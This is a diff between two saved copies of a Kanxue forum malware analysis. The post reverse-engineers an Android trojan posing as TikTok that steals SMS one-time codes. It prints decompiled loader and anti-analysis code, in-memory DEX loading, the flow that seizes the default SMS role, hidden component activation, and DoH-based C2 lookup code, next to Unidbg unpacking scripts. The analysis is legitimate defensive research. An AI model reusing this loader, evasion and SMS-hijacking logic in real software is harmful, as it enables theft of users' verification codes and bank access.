@@ -2,21 +2,27 @@
 title: 【看雪】某Android SMS 木马逆向分析
 source: https://bbs.kanxue.com/thread-291907.htm
 source_host: bbs.kanxue.com
-clip_date: 2026-07-07T21:17:23+08:00
-trace_id: 308e6f67-abd1-476c-8bfc-fdc64f9eb80a
-content_hash: 016a89db2d3d6eb9fa383c724ffeed49183efb51754ae996ac09ec00dc768939
+clip_date: 2026-07-14T16:03:33+08:00
+trace_id: c741fdc6-0f16-44d4-a0ee-fb93a20159ba
+content_hash: 8390a7b38d166d25d5ab937a544208d01e3396fe451678e7435297b875b89aed
 status: summarized
 tags:
   - 看雪
+  - Android逆向
+  - SMS木马
+  - 脱壳
+  - DoH
+  - 银行木马
+  - 恶意软件分析
 series: null
-feed_source: 看雪·Android安全
-ai_summary: 伪装成TikTok的木马通过多层加载窃取短信验证码，技术复杂度较低但结构完整。
+feed_source: null
+ai_summary: 该Android木马伪装成TikTok，通过多层加载和环境检测窃取短信验证码，具有组件动态启用和DoH隐蔽通信特征。
 ai_summary_style: key-points
 images_status:
-  total: 1
-  succeeded: 1
+  total: 5
+  succeeded: 5
   failed_urls: []
-notion_page_id: 39675244-d011-81ff-a325-dec2ac403f66
+notion_page_id: 39d75244-d011-8174-b7a2-f0db035b2d29
 ioc:
   cves: []
   cwes: []
@@ -29,26 +35,27 @@ ioc:
 
 > 💡 **AI 总结（key-points）**
 >
-> 伪装成TikTok的木马通过多层加载窃取短信验证码，技术复杂度较低但结构完整。
+> 该Android木马伪装成TikTok，通过多层加载和环境检测窃取短信验证码，具有组件动态启用和DoH隐蔽通信特征。
 > 
-> - **伪装方式：** 恶意软件以TikTok应用为名进行伪装，通过恶意下载器和安装器最终部署核心窃密程序。
-> - **加载结构：** 采用分层设计，包含Loader（解密壳）、Installer（修改包名并安装）、最终Payload（窃密核心）三个阶段。
-> - **Native解密与加载：** 核心逻辑在Native层完成，通过JNI函数解密assets目录中的加密资源文件，并在内存中动态加载解密后的DEX。
-> - **短信劫持：** 最终Payload的核心功能是劫持设备的默认短信应用，并监听、窃取接收到的短信验证码（OTP）。
-> - **分析工具：** 分析过程使用Unidbg模拟执行Native函数，以补全JNI环境并成功脱壳解密出恶意载荷。
+> - **多层加载机制：** 样本使用nativeUnpack函数从assets目录解密三个资源文件，拼接后经XOR解密和zlib解压获得Dex，并通过InMemoryDexClassLoader动态加载。
+> - **环境检测与规避：** 检测模拟器、Bot包名等自动化环境，失败时启动假界面并退出，避免恶意逻辑暴露给分析工具。
+> - **恶意权限与功能：** Payload请求READ_SMS、SEND_SMS等敏感权限，劫持默认短信应用，启用隐藏组件监听短信以窃取验证码。
+> - **C2通信方式：** 通过DoH查询Google、Cloudflare等DNS服务的TXT记录获取C2域名，但当前DNS记录已失效或未配置。
+> - **整体技术特征：** 样本采用多层加壳（XOR+ zlib）、组件动态启用和字符串混淆等简单对抗技术，技术复杂度较低。
 
-## 0x0 前言
+最近实习主要在做Android的逆向和动态下发分析相关的工作，因此在业余时间找了一个真实的木马样本进行分析，IOC在威胁情报平台上尚无匹配记录，暂无法归属到已知木马家族。经过完整分析后发现，该样本的技术复杂度较简单。本文也被发到我的公众号上，欢迎各为移步： [https://mp.weixin.qq.com/s/clCb7TEeSH3ruwLSjqnjxA](https://mp.weixin.qq.com/s/clCb7TEeSH3ruwLSjqnjxA)
 
-最近实习主要在做Android的逆向和动态下发分析相关的工作，因此在业余时间找了一个真实的木马样本进行分析，IOC在威胁情报平台上尚无匹配记录，暂无法归属到已知木马家族。经过完整分析后发现，该样本的技术复杂度较简单。本文也被发到我的公众号上：https://mp.weixin.qq.com/s/clCb7TEeSH3ruwLSjqnjxA
-
-| 项目  | 内容  | 说明  |
-| --- | --- | --- |
-| 样本来源 | MalwareBazaar | [https://bazaar.abuse.ch/sample/388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8/](https://bbs.kanxue.com/elink@ef1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5i4A6S2j5i4u0Q4x3X3g2S2j5Y4g2K6k6g2\)9J5k6h3y4Z5i4K6u0r3M7$3q4E0M7r3I4W2i4K6u0r3x3K6R3%5E5k6o6N6X3k6o6V1K6z5r3f1#2x3e0b7#2y4h3q4V1z5h3u0S2x3U0N6W2j5h3f1&6j5$3f1H3x3h3k6U0j5X3q4V1k6X3j5^5j5h3t1^5z5r3b7#2j5e0N6W2z5h3f1%4y4o6u0U0j5U0t1^5y4o6l9J5k6U0q4W2z5q4\)9J5c8R3%60.%60.) |
-| SHA256 | `388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8` |     |
-| 文件名 |     | 伪装为 TikTok |
-| 文件大小 | 7,016,188 Bytes | 约 6.69 MB |
-| First Seen | 2026-07-02 12:57:38 UTC | MalwareBazaar |
-| Tags | android、apk、banker、dropper、malware、RiskWare、signed、Tiktok | 描述样本行为及伪装目标 |
+```ruby
+样本来源: MalwareBazaar（https://bazaar.abuse.ch/sample/388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8/）
+SHA256: 388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8
+文件名: ????????????????????????_????????????????????????????????.apk
+伪装目标: TikTok 官方应用
+文件大小: 7,016,188 Bytes（约 6.69 MB）
+首次发现时间: 2026-07-02 12:57:38 UTC
+标签: android、apk、banker、dropper、malware、RiskWare、signed、Tiktok
+样本行为: Android 银行木马投递器（Dropper），通过伪装为 TikTok 应用诱导用户安装，安装后用于投递或加载恶意载荷，可能进一步实施银行凭据窃取、敏感信息收集、权限滥用及其他恶意活动。
+伪装说明: 使用 TikTok 的名称或图标进行伪装，以提高用户信任度并诱骗安装恶意 APK。
+```
 
 本文针对一种比较新的（26年7月） Android SMS 劫持恶意软件开展逆向分析，完整还原了其 Loader、安装器及最终 Payload 的执行流程，分析了动态解密、内存加载、JNI 解包、DoH 获取配置、默认短信应用劫持及短信监听等关键技术，最终确定该样本属于以短信验证码（OTP）窃取为核心的 Android SMS Hijacking 恶意软件，具有多层加载、组件动态启用、官方 DoH 隐蔽通信以及 Builder 自动化生成等典型特征。
 
@@ -79,7 +86,7 @@ protected void attachBaseContext(Context context) {
         try {
             if (iNativeLiteCheck == 3) {
                 Log.i(TAG, "silent block: liteResult=3");
-                return; // 直接退出
+                return;    // 直接退出
             }
             EnvResult envResultBuildEnvReport = buildEnvReport(context, iNativeLiteCheck);
             // 收集当前设备环境信息，判断设备是否属于"机器人/模拟器/自动化环境"
@@ -121,9 +128,7 @@ protected void attachBaseContext(Context context) {
 
 在56.al平台尝试自动脱壳，但任务异常失败，报错如下。因此只能采用手动脱壳方式。
 
-![image-20260704082625614](https://bbs.kanxue.com/plugin/chao_editor/rich_text/themes/default/images/spacer.gif)
-
-image-20260704082625614
+![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b515e6f32e9664ec.webp) ![image-20260704082625614](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/548f2d6f4d0d820c.gif)
 
 脱壳对应的函数是 `nativeUnpack` ，位于 `libpmdkzpc.so` ，该函数未使用额外的代码混淆，核心逻辑如下。
 
@@ -231,24 +236,24 @@ LABEL_34:
 
 ```java
 public static void main(String[] args) throws IOException {
- final DemoUnidbg demo = new DemoUnidbg();
- demo.traceCode(); // hook assembly
- demo.callnativeUnpack();
+    final DemoUnidbg demo = new DemoUnidbg();
+    demo.traceCode(); // hook assembly
+    demo.callnativeUnpack();
 }
 public DemoUnidbg() throws IOException {
- emulator = AndroidEmulatorBuilder
-  .for64Bit()
-  .setProcessName("com.zhiliaoapp.musically")
-  .addBackendFactory(new Unicorn2Factory(true))
-  .build();
- Memory memory = emulator.getMemory();
- memory.setLibraryResolver(new AndroidResolver(23));
- vm = emulator.createDalvikVM(new File("/home/ldz/unidbg-0.9.8/target/tiktok.apk"));
- vm.setVerbose(true);
- vm.setJni(this);
- new FixedAndroidModule(emulator, vm).register(memory);
- dm = vm.loadLibrary(new File("/home/ldz/unidbg-0.9.8/target/arm64-v8a/libpmdkzpc.so"), true);
- module = dm.getModule();
+    emulator = AndroidEmulatorBuilder
+        .for64Bit()
+        .setProcessName("com.zhiliaoapp.musically")
+        .addBackendFactory(new Unicorn2Factory(true))
+        .build();
+    Memory memory = emulator.getMemory();
+    memory.setLibraryResolver(new AndroidResolver(23));
+    vm = emulator.createDalvikVM(new File("/home/ldz/unidbg-0.9.8/target/tiktok.apk"));
+    vm.setVerbose(true);
+    vm.setJni(this);
+    new FixedAndroidModule(emulator, vm).register(memory);
+    dm = vm.loadLibrary(new File("/home/ldz/unidbg-0.9.8/target/arm64-v8a/libpmdkzpc.so"), true);
+    module = dm.getModule();
 }
 ```
 
@@ -259,14 +264,14 @@ public DemoUnidbg() throws IOException {
 JNIEnv->GetMethodID(com/supuyami/xajijupuqi/PewozipuluraApp_ff92.getAssets()Landroid/content/res/AssetManager;) => 0x7ea19d1d was called from RX@0x40001ed8[libpmdkzpc.so]0x1ed8
 [09:07:05 485]  WARN [com.github.unidbg.linux.ARM64SyscallHandler] (ARM64SyscallHandler:412) - handleInterrupt intno=2, NR=-130448, svcNumber=0x11e, PC=unidbg@0xfffe0274, LR=RX@0x40001ef4[libpmdkzpc.so]0x1ef4, syscall=null
 java.lang.UnsupportedOperationException: com/supuyami/xajijupuqi/PewozipuluraApp_ff92->getAssets()Landroid/content/res/AssetManager;
- at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:933)
- at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:867)
- at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethod(DvmMethod.java:69)
- at com.github.unidbg.linux.android.dvm.DalvikVM64$31.handle(DalvikVM64.java:533)
- at com.github.unidbg.linux.ARM64SyscallHandler.hook(ARM64SyscallHandler.java:121)
- at com.github.unidbg.arm.backend.Unicorn2Backend$11.hook(Unicorn2Backend.java:352)
- at com.github.unidbg.arm.backend.unicorn.Unicorn$NewHook.onInterrupt(Unicorn.java:109)
- at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Native Method)
+    at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:933)
+    at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:867)
+    at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethod(DvmMethod.java:69)
+    at com.github.unidbg.linux.android.dvm.DalvikVM64$31.handle(DalvikVM64.java:533)
+    at com.github.unidbg.linux.ARM64SyscallHandler.hook(ARM64SyscallHandler.java:121)
+    at com.github.unidbg.arm.backend.Unicorn2Backend$11.hook(Unicorn2Backend.java:352)
+    at com.github.unidbg.arm.backend.unicorn.Unicorn$NewHook.onInterrupt(Unicorn.java:109)
+    at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Native Method)
 ```
 
 补全 JNI 方法实现：
@@ -274,22 +279,22 @@ java.lang.UnsupportedOperationException: com/supuyami/xajijupuqi/PewozipuluraApp
 ```typescript
 @Override
 public DvmObject<?> callObjectMethodV(BaseVM vm, DvmObject<?> dvmObject, String signature, VaList vaList) {
- // 拦截 getAssets()Landroid/content/res/AssetManager; 的调用
- if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
-"com/supuyami/xajijupuqi/PewozipuluraApp_ff92-  >getAssets()Landroid/content/res/AssetManager;".equals(signature)) {
-  return vm.resolveClass("android/content/res/AssetManager").newObject(null);
- }
+    // 拦截 getAssets()Landroid/content/res/AssetManager; 的调用
+    if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
+"com/supuyami/xajijupuqi/PewozipuluraApp_ff92-        >getAssets()Landroid/content/res/AssetManager;".equals(signature)) {
+        return vm.resolveClass("android/content/res/AssetManager").newObject(null);
+    }
 
- return super.callObjectMethodV(vm, dvmObject, signature, vaList);
+    return super.callObjectMethodV(vm, dvmObject, signature, vaList);
 }
 
 @Override
 public DvmObject<?> callObjectMethod(BaseVM vm, DvmObject<?> dvmObject, String signature, VarArg varArg) {
- if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
+    if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
 "com/supuyami/xajijupuqi/PewozipuluraApp_ff92->getAssets()Landroid/content/res/AssetManager;".equals(signature)) {
-  return vm.resolveClass("android/content/res/AssetManager").newObject(null);
- }
- return super.callObjectMethod(vm, dvmObject, signature, varArg);
+        return vm.resolveClass("android/content/res/AssetManager").newObject(null);
+    }
+    return super.callObjectMethod(vm, dvmObject, signature, varArg);
 }
 ```
 
@@ -387,15 +392,11 @@ static class FixedAndroidModule extends VirtualModule<VM> {
     }
 ```
 
-运行后成功将内容 dump 为 Dex 文件，使用 Jadx 打开，可以正常反编译。
+运行后成功将内容 dump 为 Dex 文件，使用 Jadx 打开可以正常反编译。
 
-![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6d8543952b5ec177.webp)
+![image-20260704105547257](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/548f2d6f4d0d820c.gif) ![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6d8543952b5ec177.webp)
 
 分析发现，该 Dex 文件主要实现了 VPN 功能和动态安装 APK 的逻辑。
-
-![image-20260704105547257](https://bbs.kanxue.com/plugin/chao_editor/rich_text/themes/default/images/spacer.gif)
-
-image-20260704105547257
 
 ## 0x2 Installer脱壳
 
@@ -449,7 +450,7 @@ public void onCreate(Bundle bundle) {
         preparePayload(); // 安装payload
     }
 
- private final void preparePayload() {
+    private final void preparePayload() {
         BuildersKt.gimi(CoroutineScopeKt.gimi(Dispatchers.qebuhu), new Najohigeca(null));
     } // 利用 Kotlin 的协程（Coroutines）异步开启了一个后台任务，在后台静默下载或解密并强行安装 Payload。
 ```
@@ -601,4 +602,367 @@ InMemoryDexClassLoader
 启动真实Payload
 ```
 
-该 APK 的入口类为 `GexojofiApp51ef` ，其重写了 `Application.attachBaseContext()` 方法，并在应用生命周期最早阶段执行全部初始化逻辑。与第一层 Loader 相同，该样本再次采用 Native 代码完成解密，其中核心函数 `fllzsswi()` 位于 `libldcaeux.so` 中，其返回值为解密后的 DEX 字节流。当检测失败时，程序不会继续执行恶意逻辑，而是启动 `QibabumupayipeAuth76ed` Activity，仅显示一个
+该 APK 的入口类为 `GexojofiApp51ef` ，其重写了 `Application.attachBaseContext()` 方法，并在应用生命周期最早阶段执行全部初始化逻辑。与第一层 Loader 相同，该样本再次采用 Native 代码完成解密，其中核心函数 `fllzsswi()` 位于 `libldcaeux.so` 中，其返回值为解密后的 DEX 字节流。当检测失败时，程序不会继续执行恶意逻辑，而是启动 `QibabumupayipeAuth76ed` Activity，仅显示一个 **Loading...** 界面，并禁止用户返回，从而制造程序仍在正常启动的假象，同时避免恶意逻辑暴露给分析环境。
+
+脱壳函数 `fllzsswi` 位于 `libldcaeux.so` 中，代码逻辑如下：
+
+```java
+@Override // android.content.ContextWrapper
+ protected void attachBaseContext(Context context) {
+     int iGafunerz;
+     ClassLoader dexClassLoader;
+     super.attachBaseContext(context);
+     boolean zHasBotPackage = hasBotPackage(context);
+     boolean z = !zHasBotPackage && isTooFewUserApps(context);
+     boolean z2 = (zHasBotPackage || z || !isSuspiciousInstallTimes(context)) ? false : true;
+     if (zHasBotPackage || z || z2) {
+         iGafunerz = 0;
+     } else {
+         try {
+             iGafunerz = gafunerz();
+         } catch (Throwable unused) {
+             iGafunerz = 0;
+         }
+     }
+     if (zHasBotPackage || z || z2) {
+         return;
+     }
+     if (iGafunerz != 0) {
+         if (iGafunerz != 3) {
+             try {
+                 Intent intent = new Intent();
+                 intent.setClassName(context.getPackageName(), "com.vuxewo.sonaqu.QibabumupayipeAuth76ed");
+                 intent.addFlags(268468224);
+                 context.startActivity(intent);
+                 return;
+             } catch (Throwable unused2) {
+                 return;
+             }
+         }
+         return;
+     }
+     try {
+         byte[] bArrFllzsswi = fllzsswi();
+         if (bArrFllzsswi != null && bArrFllzsswi.length >= 32) {
+             ClassLoader classLoader = getClassLoader();
+             if (Build.VERSION.SDK_INT >= 26) {
+                 dexClassLoader = new InMemoryDexClassLoader(ByteBuffer.wrap(bArrFllzsswi), classLoader);
+             } else {
+                 File file = new File(context.getCacheDir(), ".dx");
+                 FileOutputStream fileOutputStream = new FileOutputStream(file);
+                 fileOutputStream.write(bArrFllzsswi);
+                 fileOutputStream.close();
+                 File file2 = new File(context.getCacheDir(), ".dxopt");
+                 file2.mkdirs();
+                 dexClassLoader = new DexClassLoader(file.getAbsolutePath(), file2.getAbsolutePath(), null, classLoader);
+             }
+             copyNativeLibDirs(classLoader, dexClassLoader);
+             swapClassLoader(context, dexClassLoader);
+             Application application = (Application) dexClassLoader.loadClass("com.vuxewo.sonaqu.WivinotazozajoApplication_bd4d").getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
+             Method declaredMethod = ContextWrapper.class.getDeclaredMethod("attachBaseContext", Context.class);
+             declaredMethod.setAccessible(true);
+             declaredMethod.invoke(application, context);
+             swapApp(context, application);
+             this.realApp = application;
+         }
+     } catch (Throwable unused3) {
+     }
+ }
+```
+
+参照第一节的脱壳方法进行修改，即可成功获得最终的 Dex 文件（恶意载荷）。
+
+## 0x4 Payload恶意行为分析
+
+恶意载荷请求了大量敏感权限，主要集中在短信和通话相关功能：
+
+| 权限  | 作用  | 风险  |
+| --- | --- | --- |
+| `AUTHENTICATE_ACCOUNTS` | 创建账户 | 创建账户、同步账户、修改账户密码 |
+| `CALL_PHONE` | 电话呼叫 | 任意拨号、查询余额 |
+| `READ_SMS` | 读取所有短信 | 可读取验证码、银行短信、通知短信等 |
+| `SEND_SMS` | 发送短信 | 可发送扣费短信、向攻击者发送数据 |
+| `RECEIVE_SMS` | 接收短信广播 | 可第一时间获知新短信 |
+| `RECEIVE_MMS` | 接收彩信 | 可监控彩信 |
+| `RECEIVE_WAP_PUSH` | 接收运营商 Push | 较少使用 |
+
+权限请求流程的伪代码如下：
+
+```css
+初始化阶段:
+├── onCreate()
+│   ├── 检查是否已完成设置（避免重复运行）
+│   ├── 显示假的骨架屏UI（迷惑用户）
+│   └── 启动权限请求流程
+│
+权限请求流程:
+├── 1. 请求SMS权限（READ_SMS, SEND_SMS, RECEIVE_SMS）
+│   ├── 成功 → 继续
+│   └── 失败 → 重试（最多3次）+ 显示Toast警告
+│
+├── 2. 请求电话权限（READ_CALL_LOG, CALL_PHONE, READ_PHONE_STATE）
+│   ├── 成功 → 继续
+│   └── 失败 → 重试（最多3次）
+│
+├── 3. 请求成为默认SMS应用（关键！）
+│   ├── Android 15小米设备 → 使用特殊Intent跳转小米权限页面
+│   ├── Android 10+ → 使用RoleManager.createRequestRoleIntent("android.app.role.SMS")
+│   ├── Android < 10 → 使用旧版SMS默认应用API
+│   ├── 成功 → 继续
+│   └── 失败 → 重试（最多2次）
+│
+权限获取后:
+├── activateCoreFunctionality() - 启用隐藏的17个恶意组件
+│   ├── DuhidewupuwoReceiver_54cf（广播接收器）
+│   ├── CigamezujudiReceiver_516d
+│   ├── 多个后台Service
+│   └── 使用setComponentEnabledSetting()动态启用
+│
+├── startCoreServices() - 启动恶意服务
+│   ├── startAllServices() - 启动前台服务
+│   ├── scheduleWorker() - 每30秒执行一次的定时任务
+│   └── createSyncAccount() - 创建同步账户
+│
+├── requestBatteryOptimization() - 请求电池白名单
+│   └── Intent: ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+│
+├── requestNotificationPermission() - 请求通知权限
+│   └── 检查是否在enabled_notification_listeners中
+│
+└── launchExternalBrowserAndFinish()
+    ├── 打开的是一个 Google 搜索页面
+    ├── 保存设置完成标志
+    └── finishAndRemoveTask() - 从任务列表中移除
+```
+
+核心伪代码：
+
+```swift
+class MalwareActivity:
+    def onCreate():
+        if already_setup_complete():
+            finish()
+            return
+    show_fake_skeleton_ui()  # 显示假UI迷惑用户
+    start_permission_flow()
+
+def start_permission_flow():
+    # 第一步：请求SMS权限
+    permissions = ["READ_SMS", "SEND_SMS", "RECEIVE_SMS"]
+    request_permissions(permissions)
+    # 回调 → requestPhonePermissions()
+
+def requestPhonePermissions():
+    # 第二步：请求电话权限
+    permissions = ["READ_CALL_LOG", "CALL_PHONE", "READ_PHONE_STATE"]
+    request_permissions(permissions)
+    # 回调 → requestSmsRole()
+
+def requestSmsRole():
+    # 第三步：成为默认SMS应用（关键！）
+    if Android >= 10:
+        roleManager = getSystemService(ROLE_SERVICE)
+        intent = roleManager.createRequestRoleIntent("android.app.role.SMS")
+        startActivityForResult(intent)
+    else:
+        # 旧版本使用旧API
+        intent = Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT")
+        intent.putExtra("package", getPackageName())
+        startActivity(intent)
+
+    # 用户授权后 → handleRoleGranted()
+
+def handleRoleGranted():
+    # 获得默认SMS应用权限后
+    enable_hidden_components()  # 启用17个隐藏组件
+    start_malicious_services()  # 启动恶意服务
+    schedule_periodic_worker()  # 每30秒执行任务
+    request_battery_whitelist()  # 请求电池优化白名单
+    request_notification_access()  # 请求通知访问
+
+    # 最后打开外部URL并退出
+    open_url(DECRYPTED_TARGET_URL)
+    finish_and_remove_task()
+
+def enable_hidden_components():
+    # 动态启用所有恶意组件（安装时禁用，避免检测）
+    for component in MALICIOUS_COMPONENTS:
+        packageManager.setComponentEnabledSetting(
+            component,
+            COMPONENT_ENABLED_STATE_ENABLED,
+            DONT_KILL_APP
+        )
+```
+
+服务启动器代码：
+
+```cpp
+private final void startAllServices() {
+    for (Class cls : CollectionsKt__CollectionsKt.listOfNotNull(MuqetobanerijomuService_c054.class)) { // here
+        try {
+            startForegroundService(new Intent(this, (Class<?>) cls));
+        } catch (Exception unused) {
+            StringFog.decrypt(new byte[]{-95, -100, 85, 58, -86, 123, 91, -46, -113, -116, 93, 42, -76, 119, 94, -50, -76, -118, 69, 54, -78, 119, 73, -62, -86, -34, 7, 59, -90}, new byte[]{-11, -23, 49, 95, -60, 30, Base64.padSymbol, -69});
+            "Ошибка при запуске сервиса ".concat(cls.getSimpleName());
+        }
+    }
+    try {
+        Intrinsics.checkNotNullParameter(RegizecumolaWorker_a1bd.class, "workerClass");
+        // ...
+}
+```
+
+## 0x5 C2 回连地址分析
+
+核心的后台服务是 `MuqetobanerijomuService_c054` ，负责与 C2 服务器建立连接。我们重点分析服务器域名的获取方式。
+
+```java
+public final Object fetchDomain(Context context0, Continuation continuation0) {
+        // ...
+        switch(falorifaxiwotimoConfig_f3a5$fetchDomain$10.label) {
+            case 0: {
+                ResultKt.throwOnFailure(object0);
+                String s = this.decryptString(FalorifaxiwotimoConfig_f3a5.OBFUSCATED_DOMAIN_B64);
+                if(s == null) {
+                    return Boxing.boxBoolean(false);
+                }
+ 
+                List list0 = CollectionsKt.listOf(new String[]{s, "ru." + s});
+                if(this.isRiskyCountry(context0)) {
+                    StringFog.decrypt(new byte[]{-83, 24, 51, 120, 70, 4, 12, -24, 42, -12, -6, -12, -101, -85, 69, -56, 42, -20, -25, -2, -104, -30, 73, -56, 0x6F, -29, (byte)0xE0, -73, -74, -62, 107, -28, 0x6F, (byte)0xD0, -38, -60, -75, -91, 12, -7, 60, -21, -3, -16, -34, -35, 0x7C, -1, 0x6F, -14, (byte)0xE1, -2, (byte)0x91, -7, 69, -40, 54, -84}, new byte[]{0x4F, (byte)0x82, -109, -105, -2, (byte)0x8B, 44, -84});
+                    list0 = CollectionsKt.listOf(new String[]{"ru." + s, s});
+                }
+ 
+                LinkedHashSet linkedHashSet0 = new LinkedHashSet();
+                list1 = list0;
+                okHttpClient0 = new Builder().connectTimeout(5L, TimeUnit.SECONDS).build();
+                falorifaxiwotimoConfig_f3a5$fetchDomain$11 = falorifaxiwotimoConfig_f3a5$fetchDomain$10;
+                set0 = linkedHashSet0;
+                context1 = context0;
+                break;
+            }
+            // ...
+```
+
+其中 `OBFUSCATED_DOMAIN_B64` 是通过 StringFog 混淆得到：
+
+```go
+StringFog.decrypt(new byte[]{(byte)0x8F, 0x60, -15, -46, 0x75, (byte)0xB1, (byte)0xC0, -58, -107, 89, -7, -42, 0x72, (byte)0xA1, -106, -93}, new byte[]{-61, 33, -55, -103, 51, -42, -85, -98});
+```
+
+解密得到 Base64 密文 `LA8KFgkXVx0OAw==` ，需要进行第二层解密。
+
+```typescript
+private final String decryptString(String base64String) {
+    try {
+        String strMzfnltfs = Yofasikumezekoxano.INSTANCE.mzfnltfs(base64String);
+        if (strMzfnltfs.length() == 0) {
+            return null;
+        }
+        return strMzfnltfs;
+    } catch (Exception unused) {
+        return null;
+    }
+}
+```
+
+对应的 Native 方法是 `public final native String mchrqrho(String data);`，JNI 函数地址为 `RX@0x40064fa0[liblibnrvzvh.so]0x64fa0` 。
+
+使用 Unidbg 模拟执行：
+
+```java
+private void callDec() throws IOException {
+        long FuncAddr = 0x64FA0;
+        Pointer jniEnv = vm.getJNIEnv();
+        DvmClass appClass =
+                vm.resolveClass("com/yourcompany/core/jni/Yofasikumezekoxano");
+
+        DvmObject<?> app =
+                appClass.newObject(null);
+
+        int handle = vm.addLocalObject(app);
+
+// 创建 Java String
+        StringObject strObj = new StringObject(vm, "LA8KFgkXVx0OAw==");
+        int str = vm.addLocalObject(strObj);
+
+        List<Object> list = new ArrayList<>();
+        list.add(jniEnv);   // X0
+        list.add(handle);   // X1 (this)
+        list.add(str);      // X2 (jstring)
+
+        Number ret = module.callFunction(emulator, FuncAddr, list.toArray());
+
+        DvmObject<?> result = vm.getObject(ret.intValue());
+        System.out.println(result.getValue());
+    }
+```
+
+执行后得到第二层密文 `ATlpPTIHHww7EkghOTFWSw==` ，该密文被拼接到 `DNS_RESOLVERS` 进行 DoH（DNS over HTTPS）查询。
+
+```javascript
+iterator0 = FalorifaxiwotimoConfig_f3a5.DNS_RESOLVERS.iterator(); 
+s5 = (String)object2; 
+iterator1 = iterator2; 
+while(iterator0.hasNext()) { 
+    Object object3 = iterator0.next(); 
+    s4 = (String)object3; 
+    long v1 = System.currentTimeMillis(); 
+    try { 
+        stringBuilder0 = new StringBuilder(); 
+        stringBuilder0.append(s4); 
+    } catch(Exception unused_ex) {
+        goto label_144; 
+    }   
+    try {
+        stringBuilder0.append("?name="); 
+        stringBuilder0.append(s5); // 之前得到的ATlpPTIHHww7EkghOTFWSw==
+        stringBuilder0.append("&type=TXT&random="); 
+        stringBuilder0.append(v1); // 时间戳
+    }
+```
+
+DNS 服务器地址列表如下：
+
+```swift
+private static final List<String> DNS_RESOLVERS =
+    listOf(
+        "https://dns.google/resolve",
+        "https://1.1.1.1/dns-query",
+        "https://cloudflare-dns.com/dns-query"
+    );
+```
+
+DoH 查询会返回包含真实 C2 域名的 TXT 记录，但目前该 DNS 记录未发布或已失效，无法获取目标域名。
+
+## 0x6 写在最后
+
+本次分析从原始APK中总共提取出了三个文件：第一个Dex文件包含VPN、环境检查等反沙箱逻辑；第二个APK文件作为壳层，负责动态加载和包名替换；第三个Dex文件是最终的恶意载荷，实现了短信拦截、默认短信应用劫持以及C2回连等核心功能。
+
+整体而言，这个银行木马的逆向难度并不高，主要的对抗集中在：多层加壳（Assets XOR + zlib解压）、环境检测（检测Bot包名、安装应用数量、安装时间分布）、组件动态启用（安装时禁用恶意组件避免静态检测），以及简单的字符串混淆。此外，由于DoH查询已失效，或者，攻击者目前还没上传对应的DNS条目，也许在未来将会上传。
+
+[#逆向分析](https://bbs.kanxue.com/forum-161-1-118.htm) [#脱壳反混淆](https://bbs.kanxue.com/forum-161-1-122.htm)
+
+* * *
+
+## 评论
+
+> **ldz666 · 2 楼**
+> 
+> woc，格式为什么会这样
+
+> **Moezero · 3 楼**
+> 
+> 脱壳网站更新了可以重新试试看看
+
+> **Cure. · 4 楼**
+> 
+> 学习
+
+> **巷口的那只猫 · 5 楼**
+> 
+> 推特好多假的福利姬 就引流到tg下载类似apk，主要就是上传图片 联系人 短信等功能，倒没主动发送sms功能。
+
+> **葱葱油油 · 6 楼**
+> 
+> 学习了，但没学会
